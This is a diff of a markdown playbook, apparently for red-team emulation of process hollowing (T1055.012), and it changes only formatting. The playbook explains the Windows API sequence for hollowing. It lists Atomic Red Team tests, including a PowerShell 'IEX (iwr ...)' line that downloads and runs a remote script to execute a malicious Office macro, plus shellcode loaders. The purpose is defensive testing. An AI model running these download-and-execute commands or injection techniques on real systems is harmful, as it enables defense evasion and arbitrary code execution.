@@ -51,7 +51,7 @@ severity_boost:
 
 ## High-Level Description
 
-Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. 
+Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.
 
 Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code> before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.
 
@@ -91,6 +91,7 @@ Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -
 ```
 
 **Dependencies:**
+
 - Start-Hollow.ps1 must be installed
 
 ### Atomic Test 2: RunPE via VBA
@@ -101,16 +102,18 @@ This module executes notepad.exe from within the WINWORD.EXE process
 
 ```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
 Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "#{ms_product}" -sub "Exploit"
 ```
 
 **Dependencies:**
+
 - Microsoft #{ms_product} must be installed
 
 ### Atomic Test 3: Process Hollowing in Go using CreateProcessW WinAPI
 
 Creates a process in a suspended state, executes shellcode to spawn calc.exe in a child process, and then resumes the original process.
+
 - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocess)
 
 **Supported Platforms:** windows
@@ -124,6 +127,7 @@ $PathToAtomicsFolder\T1055.012\bin\x64\CreateProcess.exe -program "#{hollow_bina
 Create a process in a suspended state, execute shellcode to spawn calc.exe in a child process, and then resume the original process.
 This test uses the CreatePipe function to create an anonymous pipe that parent and child processes can communicate over. This anonymous pipe
 allows for the retrieval of output generated from executed shellcode.
+
 - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)
 
 **Supported Platforms:** windows
@@ -131,7 +135,6 @@ allows for the retrieval of output generated from executed shellcode.
 ```powershell
 $PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "#{hollow_binary_path}" -debug
 ```
-
 
 ### Manual Testing
 
@@ -146,26 +149,24 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1040 Behavior Prevention on Endpoint
-Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process.
 
+Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process.
 
 ## Detection
 
 ### Detection Strategy for Process Hollowing on Windows
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Process Hollowing technique applicable | High | Defense Evasion |
+| Finding                                | Severity | Impact          |
+| -------------------------------------- | -------- | --------------- |
+| Process Hollowing technique applicable | High     | Defense Evasion |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                        |
+| ------- | ---------------------------- |
 | CWE-693 | Protection Mechanism Failure |
-
 
 ## References
 
